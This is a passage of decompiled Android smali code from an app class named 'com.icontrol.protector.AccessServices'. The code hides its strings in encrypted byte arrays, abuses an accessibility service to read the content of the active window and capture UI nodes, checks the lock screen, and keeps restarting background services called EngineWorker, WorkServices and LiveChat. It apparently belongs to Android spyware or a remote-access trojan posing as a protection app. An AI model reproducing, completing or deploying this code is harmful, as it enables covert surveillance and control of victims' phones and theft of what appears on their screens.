        -0x24t
        0x46t
        0x0t
        0x7at
        -0x73t
        -0x7ft
        -0x40t
        -0xat
        -0x35t
        0x40t
        0xat
        0x7et
        -0x64t
        -0x3at
    .end array-data

    :array_1
    .array-data 1
        0x6ft
        0x13t
        -0x17t
        -0x51t
        -0x4dt
        -0x71t
        -0x48t
        0x34t
    .end array-data

    :array_2
    .array-data 1
        0x10t
        -0x7dt
        -0x13t
    .end array-data

    :array_3
    .array-data 1
        0x71t
        -0x10t
        -0x77t
        0x4ct
        0x2bt
        -0x77t
        -0x2at
        0x7et
    .end array-data

    :array_4
    .array-data 1
        0x36t
        0x31t
        -0x6et
        -0x4t
        -0x71t
        -0x4at
        0xat
        0x1ct
    .end array-data

    :array_5
    .array-data 1
        0x2ft
        -0x6t
        -0xdt
        -0x5ft
        -0x2et
        -0xft
        0x5et
        -0x7t
        0x23t
        -0x4t
        -0x6t
        -0x5ft
        -0x40t
        -0x1at
        0x49t
        -0x1t
        0x29t
        -0x8t
        -0x15t
        -0x1at
        -0x77t
        -0xat
        0x5et
        -0x5ct
        0x28t
        -0x10t
        -0xet
        -0x16t
        -0x39t
        -0x6t
        0x65t
        -0x17t
        0x39t
        -0x1ft
        -0x16t
        -0x20t
        -0x23t
    .end array-data

    nop

    :array_6
    .array-data 1
        0x4ct
        -0x6bt
        -0x62t
        -0x71t
        -0x4dt
        -0x61t
        0x3at
        -0x75t
    .end array-data

    :array_7
    .array-data 1
        -0x7ft
        0x4bt
        0x78t
        0x73t
        0x59t
        -0x65t
        0x22t
        -0x30t
        -0x73t
        0x4dt
        0x71t
        0x73t
        0x4bt
        -0x74t
        0x35t
        -0x2at
        -0x79t
        0x49t
        0x60t
        0x34t
        0x2t
        -0x64t
        0x22t
        -0x73t
        -0x6ct
        0x4dt
        0x63t
        0x32t
        0x67t
        -0x6at
        0x27t
        -0x34t
        -0x7ft
        0x41t
        0x79t
    .end array-data

    :array_8
    .array-data 1
        -0x1et
        0x24t
        0x15t
        0x5dt
        0x38t
        -0xbt
        0x46t
        -0x5et
    .end array-data
.end method

.method public m()V
    .locals 9

    .line 1
    const/4 v0, 0x1

    new-array v1, v0, [B

    const/4 v2, 0x2

    const/4 v3, 0x0

    aput-byte v2, v1, v3

    const/16 v2, 0x8

    new-array v4, v2, [B

    fill-array-data v4, :array_0

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v4, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v5, 0x3

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    new-array v7, v2, [B

    fill-array-data v7, :array_2

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-static {v4, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Ljava/lang/Thread;

    new-instance v4, Lcom/icontrol/protector/AccessServices$g;

    invoke-direct {v4, p0}, Lcom/icontrol/protector/AccessServices$g;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :cond_0
    new-array v1, v0, [B

    const/16 v4, -0x75

    aput-byte v4, v1, v3

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v4, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v6, v5, [B

    fill-array-data v6, :array_4

    new-array v8, v2, [B

    fill-array-data v8, :array_5

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v4, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    new-instance v1, Ljava/lang/Thread;

    new-instance v4, Lcom/icontrol/protector/AccessServices$h;

    invoke-direct {v4, p0}, Lcom/icontrol/protector/AccessServices$h;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :cond_1
    new-array v1, v0, [B

    const/16 v4, -0xe

    aput-byte v4, v1, v3

    new-array v4, v2, [B

    fill-array-data v4, :array_6

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v4, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v6, v5, [B

    fill-array-data v6, :array_7

    new-array v8, v2, [B

    fill-array-data v8, :array_8

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v4, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    sput-boolean v0, Lcom/icontrol/protector/AccessServices;->T:Z

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices;->i:Landroid/os/Handler;

    const/16 v4, 0x321

    invoke-virtual {v1, v4}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    :cond_2
    new-array v1, v0, [B

    const/16 v4, -0x2b

    aput-byte v4, v1, v3

    new-array v4, v2, [B

    fill-array-data v4, :array_9

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v4, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v6, v5, [B

    fill-array-data v6, :array_a

    new-array v8, v2, [B

    fill-array-data v8, :array_b

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v4, v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    sput-boolean v0, Lcom/icontrol/protector/AccessServices;->T:Z

    iget-object v1, p0, Lcom/icontrol/protector/AccessServices;->i:Landroid/os/Handler;

    const/16 v4, 0x322

    invoke-virtual {v1, v4}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    :cond_3
    new-array v0, v0, [B

    const/16 v1, 0x55

    aput-byte v1, v0, v3

    new-array v1, v2, [B

    fill-array-data v1, :array_c

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v3, v5, [B

    fill-array-data v3, :array_d

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    invoke-virtual {p0}, Lcom/icontrol/protector/AccessServices;->q()V

    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        0x33t
        -0x3ct
        0x49t
        -0x1bt
        0x27t
        -0x18t
        -0xat
        0x48t
    .end array-data

    :array_1
    .array-data 1
        0x4t
        0x76t
        0x1ft
    .end array-data

    :array_2
    .array-data 1
        0x65t
        0x5t
        0x7bt
        -0x9t
        -0x45t
        0x14t
        0x66t
        0x32t
    .end array-data

    :array_3
    .array-data 1
        -0x47t
        0x1at
        0x33t
        -0x4et
        -0x3bt
        0x37t
        -0x32t
        -0x3bt
    .end array-data

    :array_4
    .array-data 1
        0x46t
        0x70t
        -0x45t
    .end array-data

    :array_5
    .array-data 1
        0x27t
        0x3t
        -0x21t
        0x9t
        -0x2at
        -0x53t
        0x2at
        0x54t
    .end array-data

    :array_6
    .array-data 1
        -0x3ft
        -0x12t
        0x53t
        0x66t
        0x19t
        -0x53t
        0xdt
        -0x2bt
    .end array-data

    :array_7
    .array-data 1
        -0x66t
        0x7dt
        0x4et
    .end array-data

    :array_8
    .array-data 1
        -0x5t
        0xet
        0x2at
        -0x55t
        0x79t
        0x6ct
        -0x2t
        -0x6dt
    .end array-data

    :array_9
    .array-data 1
        -0x1ft
        -0xct
        -0x5ct
        -0x61t
        0x55t
        0x72t
        0x7at
        -0x40t
    .end array-data

    :array_a
    .array-data 1
        -0x3et
        0x27t
        -0x1bt
    .end array-data

    :array_b
    .array-data 1
        -0x5dt
        0x54t
        -0x7ft
        -0x20t
        -0x5dt
        0x39t
        0x2at
        0x3et
    .end array-data

    :array_c
    .array-data 1
        0x60t
        -0x69t
        0x67t
        -0x72t
        0x4bt
        -0x1at
        0x7t
        -0x79t
    .end array-data

    :array_d
    .array-data 1
        -0x2et
        0x0t
        -0x18t
    .end array-data

    :array_e
    .array-data 1
        -0x4dt
        0x73t
        -0x74t
        -0x5ct
        0x76t
        0x2t
        -0xet
        0x4dt
    .end array-data
.end method

.method public o(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 2

    .line 1
    const-string v0, ""

    if-nez p1, :cond_0

    return-object v0

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_1
    return-object v0
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 17

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    new-array v5, v3, [B

    fill-array-data v5, :array_1

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/KeyguardManager;

    invoke-virtual {v4}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v4

    if-nez v4, :cond_0

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v40;->a(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    invoke-static {v2, v1}, Lcom/icontrol/protector/h;->h(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    invoke-static/range {p1 .. p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r2;->g(Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_0
    new-array v4, v3, [B

    fill-array-data v4, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-nez v4, :cond_1

    invoke-static {v2, v1}, Lcom/icontrol/protector/m;->B0(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    :cond_1
    new-array v4, v3, [B

    fill-array-data v4, :array_4

    new-array v6, v3, [B

    fill-array-data v6, :array_5

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-virtual/range {p0 .. p1}, Lcom/icontrol/protector/AccessServices;->k(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zf0;->b()Z

    move-result v4

    if-nez v4, :cond_2

    invoke-static {v2, v1}, Lcom/icontrol/protector/c;->f(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V

    :cond_2
    invoke-static {v2, v1}, Lcom/icontrol/protector/i;->f(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V

    sget-boolean v4, Lcom/icontrol/protector/i;->a:Z

    if-nez v4, :cond_3

    invoke-static {v2, v1}, Lcom/icontrol/protector/l;->e(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    :cond_3
    const-class v4, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v5

    const/16 v6, 0x1a

    if-nez v5, :cond_5

    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v4, v6, :cond_4

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_4
    invoke-virtual {v0, v5}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_5
    :goto_0
    const-class v4, Lcom/icontrol/protector/WorkServices;

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v5

    if-nez v5, :cond_7

    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v4, v6, :cond_6

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    :cond_6
    invoke-virtual {v0, v5}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_7
    :goto_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v4

    const-class v5, Lcom/icontrol/protector/LiveChat;

    if-eqz v4, :cond_8

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_a

    :cond_8
    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4, v0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v5, v6, :cond_9

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_2

    :cond_9
    invoke-virtual {v0, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_a
    :goto_2
    new-instance v4, Ljava/text/SimpleDateFormat;

    const/16 v5, 0x13

    new-array v5, v5, [B

    fill-array-data v5, :array_6

    new-array v7, v3, [B

    fill-array-data v7, :array_7

    invoke-static {v5, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v5, Ljava/util/Date;

    invoke-direct {v5}, Ljava/util/Date;-><init>()V

    invoke-virtual {v4, v5}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    const/4 v5, 0x0

    :goto_3
    :try_start_1
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :catch_1
    const/4 v7, 0x0

    :goto_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v8

    if-eqz v5, :cond_b

    :try_start_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    if-eqz v9, :cond_b

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    const/16 v10, 0x17

    new-array v10, v10, [B

    fill-array-data v10, :array_8

    new-array v11, v3, [B

    fill-array-data v11, :array_9

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_b

    sput-object v5, Lcom/icontrol/protector/AccessServices;->E:Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_b
    const/4 v9, 0x5

    new-array v10, v9, [B

    fill-array-data v10, :array_a

    new-array v11, v3, [B

    fill-array-data v11, :array_b

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    sget-object v11, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    const/4 v12, 0x0

    const/4 v13, 0x1

    if-eqz v10, :cond_c

    invoke-static {}, Lcom/icontrol/protector/k;->a()[Ljava/lang/String;

    move-result-object v10

    invoke-static {v0, v10}, Lcom/icontrol/protector/k;->c(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_c

    new-array v10, v3, [B

    fill-array-data v10, :array_c

    new-array v14, v3, [B

    fill-array-data v14, :array_d

    invoke-static {v10, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-static {v0, v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-nez v10, :cond_c

    sget-object v10, Lcom/icontrol/protector/My_Configs;->Use_Access:Ljava/lang/String;

    new-array v14, v13, [B

    const/16 v15, 0x5c

    aput-byte v15, v14, v12

    new-array v15, v3, [B

    fill-array-data v15, :array_e

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v10, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_c

    if-eqz v7, :cond_c

    invoke-static {v5}, Lcom/icontrol/protector/a;->h(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_c
    const/4 v10, 0x7

    new-array v14, v10, [B

    fill-array-data v14, :array_f

    new-array v15, v3, [B

    fill-array-data v15, :array_10

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-static {v0, v14, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v14

    if-eqz v14, :cond_d

    new-array v14, v3, [B

    fill-array-data v14, :array_11

    new-array v15, v3, [B

    fill-array-data v15, :array_12

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-static {v0, v14, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v14

    if-nez v14, :cond_d

    sget-object v14, Lcom/icontrol/protector/My_Configs;->Use_Access:Ljava/lang/String;

    new-array v15, v13, [B

    const/16 v16, 0x41

    aput-byte v16, v15, v12

    new-array v4, v3, [B

    fill-array-data v4, :array_13

    invoke-static {v15, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v14, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_d

    if-eqz v7, :cond_d

    invoke-static {v5}, Lcom/icontrol/protector/a;->i(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_d
    new-array v4, v3, [B

    fill-array-data v4, :array_14

    new-array v14, v3, [B

    fill-array-data v14, :array_15

    invoke-static {v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

